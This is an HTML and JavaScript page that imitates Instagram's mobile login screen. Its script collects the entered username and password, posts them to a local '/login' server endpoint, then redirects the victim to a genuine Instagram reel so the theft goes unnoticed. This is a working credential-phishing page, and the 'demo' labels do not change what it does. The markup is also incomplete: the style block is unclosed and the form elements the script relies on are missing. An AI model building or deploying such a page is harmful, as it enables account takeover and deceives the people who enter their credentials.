<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <title>Instagram</title>
    <style>
:root {
  --blue: #2a63d7;
  --text: #141414;
  --muted: #696b70;
  --border: #e1e1e5;
  --screen-width: 375px;
  font-family: Arial, Helvetica, sans-serif;
}
* { box-sizing: border-box; }
html, body { min-height: 100%; }
body {
  margin: 0;
  overflow: hidden;
  background: #fff;
  color: var(--text);
}
button, input { font: inherit; }
.app-screen {
  position: relative;
  width: min(100%, var(--screen-width));
  height: min(100dvh, 693.33px);
  margin: 0 auto;
  overflow: hidden;
  background: #fff;
}
.language {
  position: absolute;
  top: 16.67px;
  left: 0;
  width: 100%;
  color: var(--muted);
  font-size: 14px;
  text-align: center;
}
.instagram-logo {
  position: absolute;
  top: 89.33px;
  left: 50%;
  width: 61px;
  height: 61px;
  transform: translateX(-50%);
  background: #fff;
}
/* optional: replace the src with your own logo */
.reference-sprite {
  position: absolute;
  width: 375px;
  max-width: none;
  height: auto;
  pointer-events: none;
  user-select: none;
}
.logo-sprite {
  top: -89.33px;
  left: -157.33px;
}
.login-form {
  position: absolute;
  top: 223.33px;
  right: 16px;
  left: 16px;
  display: grid;
  grid-template-rows: 62.33px 62.33px 44px;
  gap: 12px;
}
.login-input {
  width: 100%;
  padding: 0 16.67px;
  border: 1px solid var(--border);
  border-radius: 17px;
  outline: 0;
  background: #fff;
  font-size: 16px;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.login-input:focus {
  border-color: #aeb2b8;
  box-shadow: 0 0 0 1px #aeb2b8;
}
.login-button, .create-account {
  width: 100%;
  border-radius: 999px;
  font-size: 16px;
  line-height: 1;
  cursor: pointer;
  transition: transform 0.15s, opacity 0.15s, background 0.2s;
}
.login-button {
  padding: 0 16px;
  border: 1px solid var(--blue);
  background: var(--blue);
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  min-height: 44px;
}
.login-button:disabled {
  cursor: not-allowed;
  opacity: 0.7;
}
.login-button .spinner {
  display: none;
  width: 20px;
  height: 20px;
  border: 2px solid rgba(255,255,255,0.3);
  border-top-color: #fff;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
.login-button.loading .spinner {
  display: inline-block;
}
@keyframes spin { to { transform: rotate(360deg); } }
.forgot-password {
  position: absolute;
  top: 435px;
  left: 0;
  width: 100%;
  font-size: 16px;
  text-align: center;
  transition: color 0.2s, text-decoration 0.2s;
}
button.forgot-password {
  padding: 0;
  border: 0;
  background: transparent;
  color: var(--muted);
  cursor: pointer;
}
button.forgot-password:hover {
  color: var(--text);
  text-decoration: underline;
}
.create-account {
  position: absolute;
  top: 571.33px;
  right: 16px;
  left: 16px;
  height: 44px;
  padding: 0 16px;
  border: 1px solid var(--blue);
  background: #fff;
  color: var(--blue);
  transition: background 0.2s, color 0.2s;
}
.create-account:hover {
  background: var(--blue);
  color: #fff;
}
.meta-brand {
  position: absolute;
  top: 634.67px;
  left: 50%;
  width: 60.67px;
  height: 13.33px;
  transform: translateX(-50%);
  background: #fff;
}
.demo-toast {
  position: absolute;
  right: 16px;
  bottom: 18px;
  left: 16px;
  z-index: 5;
  padding: 10px 13px;
  border-radius: 12px;
  background: rgba(0,0,0,0.88);
  color: #fff;
  font-size: 12px;
  text-align: center;
  opacity: 0;
  transform: translateY(8px);
  transition: opacity 140ms, transform 140ms;
  pointer-events: none;
}
.demo-toast.is-visible {
  opacity: 1;
  transform: translateY(0);
}
.sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0; }
@media (min-width: 376px) {
  body { background: #f5f5f5; }
  .app-screen { box-shadow: 0 0 35px rgba(0,0,0,0.06); }
}
@media (prefers-reduced-motion: reduce) {
  * { transition-duration: 0.01ms !important; }
}

    <script>
      (() => {
        "use strict";

        const showToast = (message) => {
          const toast = document.querySelector("[data-toast]");
          if (!toast) return;
          toast.textContent = message;
          toast.classList.add("is-visible");
          clearTimeout(window.toastTimeout);
          window.toastTimeout = setTimeout(() => toast.classList.remove("is-visible"), 3000);
        };

        const discardInputs = (form) => {
          form.querySelectorAll("input").forEach(input => input.value = "");
        };

        document.querySelectorAll("[data-login-form]").forEach((form) => {
          form.addEventListener("submit", async (event) => {
            event.preventDefault();

            const usernameInput = form.querySelector("#login-id");
            const passwordInput = form.querySelector("#login-password");
            const username = usernameInput?.value.trim();
            const password = passwordInput?.value.trim();

            if (!username || !password) {
              showToast("Enter both fields.");
              return;
            }

            const button = form.querySelector(".login-button");
            button.disabled = true;
            button.classList.add("loading");
            button.querySelector(".btn-text").textContent = "Logging in…";

            try {
              const response = await fetch("/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username, password })
              });

              const result = await response.json();

              if (response.ok) {
                discardInputs(form);
                // Redirect to your specific Reel
                window.location.href = "https://www.instagram.com/reel/DcjC8rvIXFf/?utm_source=ig_web_copy_link&igsi=MzRlODBiNWFlZA==";
              } else {
                showToast(`Error: ${result.error || "Unknown error"}`);
              }
            } catch (err) {
              showToast("Server unreachable. Is Node.js running?");
            } finally {
              button.disabled = false;
              button.classList.remove("loading");
              button.querySelector(".btn-text").textContent = "Log in";
            }
          });
        });

        document.querySelectorAll("[data-demo-action]").forEach(button => {
          button.addEventListener("click", () => {
            showToast(`${button.dataset.demoAction} is disabled in this demo.`);
          });
        });
      })();
    </script>
